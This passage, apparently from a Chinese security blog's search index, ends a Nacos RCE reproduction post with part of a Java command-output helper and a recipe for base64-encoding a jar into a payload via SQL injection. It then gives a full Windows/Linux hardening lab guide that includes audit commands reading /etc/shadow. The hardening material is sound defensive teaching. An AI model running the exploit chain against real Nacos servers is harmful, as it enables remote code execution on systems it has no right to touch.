class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">                <span class="keyword">if</span> (line == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> bf.toString();</span><br><span class="line">                &#125;</span><br><span class="line">                bf.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">printer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(writer);</span><br><span class="line">            e.printStackTrace(printer);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writer.close();</span><br><span class="line">                printer.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + writer.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以基本步骤是生成一个jar，然后转化为base64的bin。填入servic.py里面的payload就行，应该是利用nacos的sql注入漏洞就可以导致一系列的连锁反应，敬佩大佬！！！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 远程代码执行 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nacos </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>川大实训-安全加固实验</title>
      <link href="/post/9437c481.html"/>
      <url>/post/9437c481.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是安全加固？"><a href="#什么是安全加固？" class="headerlink" title="什么是安全加固？"></a>什么是安全加固？</h1><p>安全加固和优化是实现信息系统安全的关键环节。通过安全加固，将在信息系统的网络层、主机层、软件层等层次建立符合安全需求的安全状态，并以此作为保证用户信息系统安全的起点</p><p>安全加固是配置软件系统的过程中，针对服务器操作系统、数据库及应用中间件等软件系统，通过打补丁、强化账号安全、加固服务、修改安全配置、优化访问控制策略、增加安全机制等方法，堵塞漏洞和“后门”，合理进行安全性加强，提高其健壮性和安全性，增加攻击者入侵的难度，提升系统安全防范水平</p><h1 id="Windows安全加固"><a href="#Windows安全加固" class="headerlink" title="Windows安全加固"></a>Windows安全加固</h1><p>这里以win7虚拟机为例子，在进行实验之前，<strong>一定要记得提前拍好快照</strong>，以方便在实验结束后恢复实验前的状态</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719093233808.png" alt="image-20240719093233808"></p><p>点击这个键拍摄虚拟机快照，方便我们及时恢复原来的状态</p><h2 id="Windows配置的途径"><a href="#Windows配置的途径" class="headerlink" title="Windows配置的途径"></a>Windows配置的途径</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">组策略（gpedit.msc)</span><br><span class="line">命令（cmd或powershell中执行，或者编写批处理文件bat执行）</span><br><span class="line">注册表（regedit）</span><br><span class="line">配置文件（每个人都不一样，根据实际情况进行配置）</span><br></pre></td></tr></table></figure><h2 id="账户管理和认证授权"><a href="#账户管理和认证授权" class="headerlink" title="账户管理和认证授权"></a>账户管理和认证授权</h2><h3 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h3><h4 id="默认账户安全"><a href="#默认账户安全" class="headerlink" title="默认账户安全"></a>默认账户安全</h4><ul><li>禁用 Guest 账户。</li><li>禁用或删除其他无用账户（建议先禁用账户三个月，待确认没有问题后删除。）</li></ul><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>计算机管理</strong>，在 <strong>系统工具</strong> &gt; <strong>本地用户和组</strong> &gt; <strong>用户</strong> 中，双击 <strong>Guest</strong> 帐户，在属性中选中 <strong>帐户已禁用</strong>，单击 <strong>确定</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719094714718.png" alt="image-20240719094714718"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719094824712.png" alt="image-20240719094824712"></p><h4 id="按照用户分配账户"><a href="#按照用户分配账户" class="headerlink" title="按照用户分配账户"></a>按照用户分配账户</h4><p>按照用户分配帐户。根据业务要求，设定不同的用户和用户组。例如，管理员用户，数据库用户，审计用户，来宾用户等。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>计算机管理</strong>，在 <strong>系统工具</strong> &gt; <strong>本地用户和组</strong> 中，根据您的业务要求设定不同的用户和用户组，包括管理员用户、数据库用户、审计用户、来宾用户等。</p><p>我们这里新建一个数据库用户，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719095520109.png" alt="image-20240719095520109"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719095543535.png" alt="image-20240719095543535"></p><p>同理，可以在组内也创建新的组</p><h4 id="定期检查并删除与无关帐户"><a href="#定期检查并删除与无关帐户" class="headerlink" title="定期检查并删除与无关帐户"></a>定期检查并删除与无关帐户</h4><p>定期删除或锁定与设备运行、维护等与工作无关的帐户。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>计算机管理</strong>，在 <strong>系统工具</strong> &gt; <strong>本地用户和组</strong> 中，删除或锁定与设备运行、维护等与工作无关的帐户。</p><p>这里我们可以将刚刚创建的SQL用户删除</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719095818935.png" alt="image-20240719095818935"></p><h4 id="不显示最后的用户名"><a href="#不显示最后的用户名" class="headerlink" title="不显示最后的用户名"></a>不显示最后的用户名</h4><p>配置登录登出后，不显示用户名称。</p><p><strong>操作步骤：</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，双击 <strong>交互式登录：不显示最后的用户名</strong>，选择 <strong>已启用</strong> 并单击 <strong>确定</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719100107910.png" alt="image-20240719100107910"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719100127663.png" alt="image-20240719100127663"></p><h4 id="检查影子账户"><a href="#检查影子账户" class="headerlink" title="检查影子账户"></a>检查影子账户</h4><p>如何找到影子账户</p><ol><li><p>“Win+R”键调出“运行”-&gt;regedit</p></li><li><p>打开“注册表编辑器”，找到[HKEY_LOCAL_MACHINE\SAM\SAM]，右击该项选择“权限”，选中“组或用户名称”列表中的“Administrators”，勾选“完全控制”后点击“确定”。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719100448836.png" alt="image-20240719100448836"></p></li><li><p>按F5刷新一下注册表就会发现可以打开该项的下级分支了，找到[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names]，其下的子项就是系统中的账户名。</p></li><li><p>继续展开[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator]，查看并记录下该项的默认值。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719100716743.png" alt="image-20240719100716743"></p></li><li><p>查看Administrator帐号所对应的键值和”users”子项里的相对应,”users”里包含的就是该帐户的权限的键值（比如：Administrator的键值是1f4为结尾的，就从上面users里面找1f4为结尾的键）。打开Administrator所对应的”F”键值并复制里面的16进制。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719100944675.png" alt="image-20240719100944675"></p></li><li><p>依次检查[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names]下的所有子项，如果某个子项的默认值与刚才记录下的Administrator的默认值相同，那么这个就是影子账户了，当然不能给黑客留一把后门“钥匙”，毫不犹豫地删除之。我的虚拟机中不存在这个问题，没有影子账户</p></li><li><p>除Administrator外，黑客还可能复制出其他账户的用户数据“保管箱”的“钥匙”，所以保险起见还需检查[HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names]下所有子项的默认值是否有相同。</p></li></ol><h3 id="口令"><a href="#口令" class="headerlink" title="口令"></a>口令</h3><h4 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h4><p>密码复杂度要求必须满足以下策略：</p><ul><li>最短密码长度要求八个字符。</li><li>启用本机组策略中密码必须符合复杂性要求的策略。</li></ul><p>即密码至少包含以下四种类别的字符中的两种：</p><ul><li>英语大写字母 A, B, C, … Z</li><li>英语小写字母 a, b, c, … z</li><li>西方阿拉伯数字 0, 1, 2, … 9</li><li>非字母数字字符，如标点符号，@, #, $, %, &amp;, * 等</li></ul><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>帐户策略</strong> &gt; <strong>密码策略</strong> 中，确认 <strong>密码必须符合复杂性要求</strong> 策略已启用。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719101425082.png" alt="image-20240719101425082"></p><p>我们将这个被禁用的开关打开即可</p><h4 id="密码最长留存期"><a href="#密码最长留存期" class="headerlink" title="密码最长留存期"></a>密码最长留存期</h4><p>对于采用静态口令认证技术的设备，帐户口令的留存期不应长于 90 天。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>帐户策略</strong> &gt; <strong>密码策略</strong> 中，配置 <strong>密码最长使用期限</strong> 不大于 90 天。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719101604624.png" alt="image-20240719101604624"></p><h4 id="账户锁定策略"><a href="#账户锁定策略" class="headerlink" title="账户锁定策略"></a>账户锁定策略</h4><p>对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过 10 次后，锁定该用户使用的帐户。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>帐户策略</strong> &gt; <strong>帐户锁定策略</strong> 中，配置 <strong>帐户锁定阈值</strong> 不大于 10 次。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719101745691.png" alt="image-20240719101745691"></p><h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3><h4 id="远程关机"><a href="#远程关机" class="headerlink" title="远程关机"></a>远程关机</h4><p>在本地安全设置中，从远端系统强制关机权限只分配给 Administrators 组。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>从远端系统强制关机</strong> 权限只分配给 Administrators 组。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102313478.png" alt="image-20240719102313478"></p><h4 id="本地关机"><a href="#本地关机" class="headerlink" title="本地关机"></a>本地关机</h4><p>在本地安全设置中关闭系统权限只分配给 Administrators 组。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>关闭系统</strong> 权限只分配给 Administrators 组。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102027898.png" alt="image-20240719102027898"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102027898.png" alt=""></p><h4 id="用户权限指派"><a href="#用户权限指派" class="headerlink" title="用户权限指派"></a>用户权限指派</h4><p>在本地安全设置中，取得文件或其它对象的所有权权限只分配给 Administrators 组。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>取得文件或其它对象的所有权</strong> 权限只分配给 Administrators 组。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102410051.png" alt="image-20240719102410051"></p><h4 id="授权账户登录"><a href="#授权账户登录" class="headerlink" title="授权账户登录"></a>授权账户登录</h4><p>在本地安全设置中，配置指定授权用户允许本地登录此计算机。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>允许本地登录</strong> 权限给指定授权用户。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102513028.png" alt="image-20240719102513028"></p><h4 id="授权账户从网络访问"><a href="#授权账户从网络访问" class="headerlink" title="授权账户从网络访问"></a>授权账户从网络访问</h4><p>在本地安全设置中，只允许授权帐号从网络访问（包括网络共享等，但不包括终端服务）此计算机。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>从网络访问此计算机</strong> 权限给指定授权用户。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102616341.png" alt="image-20240719102616341"></p><h2 id="日志配置操作"><a href="#日志配置操作" class="headerlink" title="日志配置操作"></a>日志配置操作</h2><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><h4 id="审核登录"><a href="#审核登录" class="headerlink" title="审核登录"></a>审核登录</h4><p>设备应配置日志功能，对用户登录进行记录。记录内容包括用户登录使用的帐户、登录是否成功、登录时间、以及远程登录时、及用户使用的 IP 地址。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核登录事件</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719102938398.png" alt="image-20240719102938398"></p><h4 id="审核策略"><a href="#审核策略" class="headerlink" title="审核策略"></a>审核策略</h4><p>启用本地安全策略中对 Windows 系统的审核策略更改，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核策略更改</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103023235.png" alt="image-20240719103023235"></p><h4 id="审核对象访问"><a href="#审核对象访问" class="headerlink" title="审核对象访问"></a>审核对象访问</h4><p>启用本地安全策略中对 Windows 系统的审核对象访问，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核对象访问</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103109794.png" alt="image-20240719103109794"></p><h4 id="审核事件目录服务访问"><a href="#审核事件目录服务访问" class="headerlink" title="审核事件目录服务访问"></a>审核事件目录服务访问</h4><p>启用本地安全策略中对 Windows 系统的审核目录服务访问，仅需要审核失败操作。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核目录服务器访问</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103200105.png" alt="image-20240719103200105"></p><h4 id="审核特权使用"><a href="#审核特权使用" class="headerlink" title="审核特权使用"></a>审核特权使用</h4><p>启用本地安全策略中对 Windows 系统的审核特权使用，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核特权使用</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103253967.png" alt="image-20240719103253967"></p><h4 id="审核系统事件"><a href="#审核系统事件" class="headerlink" title="审核系统事件"></a>审核系统事件</h4><p>启用本地安全策略中对 Windows 系统的审核系统事件，成功和失败操作都需要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核系统事件</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103415469.png" alt="image-20240719103415469"></p><h4 id="审核账户管理"><a href="#审核账户管理" class="headerlink" title="审核账户管理"></a>审核账户管理</h4><p>启用本地安全策略中对 Windows 系统的审核帐户管理，成功和失败操作都要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核帐户管理</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103456620.png" alt="image-20240719103456620"></p><h4 id="审核进程追踪"><a href="#审核进程追踪" class="headerlink" title="审核进程追踪"></a>审核进程追踪</h4><p>启用本地安全策略中对 Windows 系统的审核进程追踪，仅失败操作需要审核。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>本地安全策略</strong>，在 <strong>本地策略</strong> &gt; <strong>审核策略</strong> 中，设置 <strong>审核进程追踪</strong>。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103609120.png" alt="image-20240719103609120"></p><h4 id="日志文件大小"><a href="#日志文件大小" class="headerlink" title="日志文件大小"></a>日志文件大小</h4><p>设置应用日志文件大小至少为 8192 KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。并设置当达到最大的日志尺寸时，按需要轮询记录日志。</p><p><strong>操作步骤</strong></p><p>打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>事件查看器</strong>，配置应用日志、系统日志、安全日志属性中的日志大小，以及设置当达到最大的日志尺寸时的相应策略。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719103917753.png" alt="image-20240719103917753"></p><h4 id="针对特定目录添加审核"><a href="#针对特定目录添加审核" class="headerlink" title="针对特定目录添加审核"></a>针对特定目录添加审核</h4><p>针对特定目录添加审核</p><p>有时我们需要针对特定目录，特定账户进行的操作进行审核。</p><p><strong>具体步骤：</strong> 打开文件夹属性，选择高级，点击审核，添加审核主体，审核主体即为用户或用户组。然后设置成功或者失败 亦或者两者都审核。设置权限，设置是否应用于子目录或者文件。</p><h1 id="Linux安全加固"><a href="#Linux安全加固" class="headerlink" title="Linux安全加固"></a>Linux安全加固</h1><p>这里以我的Kali为例子，同样，在进行实验前需要对其拍摄快照</p><h2 id="账号和口令"><a href="#账号和口令" class="headerlink" title="账号和口令"></a>账号和口令</h2><h3 id="禁用或删除无用账号"><a href="#禁用或删除无用账号" class="headerlink" title="禁用或删除无用账号"></a>禁用或删除无用账号</h3><p>减少系统无用账号，降低安全风险。</p><p><strong>操作步骤</strong></p><ul><li>使用命令 sudo userdel &lt;用户名&gt; 删除不必要的账号。</li><li>使用命令 sudo passwd -l &lt;用户名&gt; 锁定不必要的账号。</li><li>使用命令 sudo passwd -u &lt;用户名&gt; 解锁必要的账号。</li></ul><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719150619206.png" alt="image-20240719150619206"></p><h3 id="检查特殊账号"><a href="#检查特殊账号" class="headerlink" title="检查特殊账号"></a>检查特殊账号</h3><p><strong>操作步骤</strong></p><p>查看空口令和 root 权限账号，确认是否存在异常账号：</p><ul><li>使用命令 awk -F: ‘($2==””)’ /etc/shadow 查看空口令账号。</li><li>使用命令 awk -F: ‘($3==0)’ /etc/passwd 查看 UID 为零的账号。</li></ul><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719150716651.png" alt="image-20240719150716651"></p><p>加固空口令账号：</p><ul><li>使用命令 passwd &lt;用户名&gt; 为空口令账号设定密码。</li><li>确认 UID 为零的账号只有 root 账号。</li></ul><p>我这里的账号已经被加固成功</p><h3 id="添加口令策略"><a href="#添加口令策略" class="headerlink" title="添加口令策略"></a>添加口令策略</h3><p>使用命令 vi /etc/login.defs 修改配置文件。</p><ul><li>PASS_MAX_DAYS 90 #新建用户的密码最长使用天数</li><li>PASS_MIN_DAYS 0 #新建用户的密码最短使用天数</li><li>PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数</li></ul><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719150902388.png" alt="image-20240719150902388"></p><p>使用 chage 命令修改用户设置。</p><p>例如，chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;表示将此用户的密码最长使用天数设为 30，最短使用天数设为 0，密码 2000 年 1 月 1 日过期，过期前七天警告用户。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719150941558.png" alt="image-20240719150941558"></p><p>设置连续输错三次密码，账号锁定五分钟。使用命令 vi /etc/pam.d/common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr=fail deny=3 unlock_time=300。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719151005598.png" alt="image-20240719151005598"></p><h3 id="限制用户su"><a href="#限制用户su" class="headerlink" title="限制用户su"></a>限制用户su</h3><p>限制能 su 到 root 的用户。</p><p><strong>操作步骤</strong></p><p>使用命令 vi /etc/pam.d/su修改配置文件，在配置文件中添加行。例如，只允许 test 组用户 su 到 root，则添加 auth required pam_wheel.so group=test。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719151312081.png" alt="image-20240719151312081"></p><h3 id="禁止root用户通过ssh直接登录"><a href="#禁止root用户通过ssh直接登录" class="headerlink" title="禁止root用户通过ssh直接登录"></a>禁止root用户通过ssh直接登录</h3><p>限制 root 用户直接登录。</p><p><strong>操作步骤</strong></p><ol><li>创建普通权限账号并配置密码, 防止无法远程登录;</li><li>使用命令 vi /etc/ssh/sshd_config修改配置文件将 PermitRootLogin 的值改成 no，并保存，然后使用service sshd restart重启服务。</li></ol><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719151530520.png" alt="image-20240719151530520"></p><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><h3 id="关闭不必要的服务"><a href="#关闭不必要的服务" class="headerlink" title="关闭不必要的服务"></a>关闭不必要的服务</h3><p>关闭不必要的服务（如普通服务和 xinetd 服务），降低风险。</p><p><strong>操作步骤</strong></p><p>使用命令systemctl disable &lt;服务名&gt;设置服务在开机时不自动启动。</p><p><strong>说明</strong>： 对于部分老版本的 Linux 操作系统（如 CentOS 6），可以使用命令chkconfig —level  &lt;服务名&gt; off设置服务在指定 init 级别下开机时不自动启动。</p><h3 id="SSH服务安全"><a href="#SSH服务安全" class="headerlink" title="SSH服务安全"></a>SSH服务安全</h3><p>对 SSH 服务进行安全加固，防止暴力破解成功。</p><p><strong>操作步骤</strong></p><p>使用命令 vim /etc/ssh/sshd_config 编辑配置文件。</p><ul><li>不允许 root 账号直接登录系统。</li></ul><p>设置 PermitRootLogin 的值为 no。</p><ul><li>修改 SSH 使用的协议版本。</li></ul><p>设置 Protocol 的版本为 2。</p><ul><li>修改允许密码错误次数（默认 6 次）。</li></ul><p>设置 MaxAuthTries 的值为 3。</p><p>配置文件修改完成后，重启 sshd 服务生效。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719152101270.png" alt="image-20240719152101270"></p><h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h3 id="设置umask值"><a href="#设置umask值" class="headerlink" title="设置umask值"></a>设置umask值</h3><p>设置默认的 umask 值，增强安全性。</p><p><strong>操作步骤</strong></p><p>使用命令 vi /etc/profile 修改配置文件，添加行 umask 027， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240719152319132.png" alt="image-20240719152319132"></p><h3 id="设置登录超时"><a href="#设置登录超时" class="headerlink" title="设置登录超时"></a>设置登录超时</h3><p>设置系统登录后，连接超时时间，增强安全性。</p><p><strong>操作步骤</strong></p><p>使用命令 vi /etc/profile 修改配置文件，将以 TMOUT= 开头的行注释，设置为TMOUT=180，即超时时间为三分钟。</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h4 id="syslogd日志"><a href="#syslogd日志" class="headerlink" title="syslogd日志"></a>syslogd日志</h4><p>启用日志功能，并配置日志记录。</p><p><strong>操作步骤</strong></p><p>Linux 系统默认启用以下类型日志：</p><ul><li>系统日志（默认）/var/log/messages</li><li>cron 日志（默认）/var/log/cron</li><li>安全日志（默认）/var/log/secure</li></ul><p><strong>注意</strong>：部分系统可能使用 syslog-ng 日志，配置文件为：/etc/syslog-ng/syslog-ng.conf。</p><h4 id="记录所有用户的登录和操作日志"><a href="#记录所有用户的登录和操作日志" class="headerlink" title="记录所有用户的登录和操作日志"></a>记录所有用户的登录和操作日志</h4><p>通过脚本代码实现记录所有用户的登录操作日志，防止出现安全事件后无据可查。</p><p><strong>操作步骤</strong></p><ol><li>运行 [root@xxx /]# vim /etc/profile打开配置文件。</li><li>在配置文件中输入以下内容：</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">USER=`whoami`</span><br><span class="line">USER_IP=`who -u am i <span class="number">2</span>&gt;/dev/null| awk <span class="string">&#x27;&#123;print $NF&#125;&#x27;</span>|sed -e <span class="string">&#x27;s/[()]//g&#x27;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$USER_IP&quot;</span> = <span class="string">&quot;&quot;</span> ]; then</span><br><span class="line">USER_IP=`hostname`</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/log/history ]; then</span><br><span class="line">mkdir /var/log/history</span><br><span class="line">chmod <span class="number">777</span> /var/log/history</span><br><span class="line">fi</span><br><span class="line"><span class="keyword">if</span> [ ! -d /var/log/history/$&#123;LOGNAME&#125; ]; then</span><br><span class="line">mkdir /var/log/history/$&#123;LOGNAME&#125;</span><br><span class="line">chmod <span class="number">300</span> /var/log/history/$&#123;LOGNAME&#125;</span><br><span class="line">fi</span><br><span class="line">export HISTSIZE=<span class="number">4096</span></span><br><span class="line">DT=`date +<span class="string">&quot;%Y%m%d_%H:%M:%S&quot;</span>`</span><br><span class="line">export HISTFILE=<span class="string">&quot;/var/log/history/$&#123;LOGNAME&#125;/$&#123;USER&#125;@$&#123;USER_IP&#125;_$DT&quot;</span></span><br><span class="line">chmod <span class="number">600</span> /var/log/history/$&#123;LOGNAME&#125;/*history* <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><ol><li>运行 [root@xxx /]# source /etc/profile 加载配置生效。</li></ol><p><strong>注意</strong>： /var/log/history 是记录日志的存放位置，可以自定义。</p><p>通过上述步骤，可以在 /var/log/history 目录下以每个用户为名新建一个文件夹，每次用户退出后都会产生以用户名、登录 IP、时间的日志文件，包含此用户本次的所有操作（root 用户除外）。</p><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="共享文件夹及访问权限"><a href="#共享文件夹及访问权限" class="headerlink" title="共享文件夹及访问权限"></a>共享文件夹及访问权限</h3><h4 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h4><p>非域环境中，关闭 Windows 硬盘默认共享，例如 C$，D$。</p><p><strong>操作步骤</strong></p><p>打开 <strong>注册表编辑器</strong>，根据推荐值修改注册表键值。</p><p><strong>注意</strong>： Win2008没有该键值，但没有关闭默认gs’xtWindows Server 2012 版本已默认关闭 Windows 硬盘默认共享，且没有该注册表键值。</p><ul><li>HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer</li></ul><h4 id="共享文件夹授权访问"><a href="#共享文件夹授权访问" class="headerlink" title="共享文件夹授权访问"></a>共享文件夹授权访问</h4><p>每个共享文件夹的共享权限，只允许授权的帐户拥有共享此文件夹的权限。</p><p><strong>操作步骤</strong></p><p>每个共享文件夹的共享权限仅限于业务需要，不要设置成为 <strong>Everyone</strong>。打开 <strong>控制面板</strong> &gt; <strong>管理工具</strong> &gt; <strong>计算机管理</strong>，在 <strong>共享文件夹</strong> 中，查看每个共享文件夹的共享权限。</p><h2 id="服务安全"><a href="#服务安全" class="headerlink" title="服务安全"></a>服务安全</h2><h3 id="禁用TCP-IP上的NetBIOS"><a href="#禁用TCP-IP上的NetBIOS" class="headerlink" title="禁用TCP/IP上的NetBIOS"></a>禁用TCP/IP上的NetBIOS</h3><p>禁用 TCP/IP 上的 NetBIOS 协议，可以关闭监听的 UDP 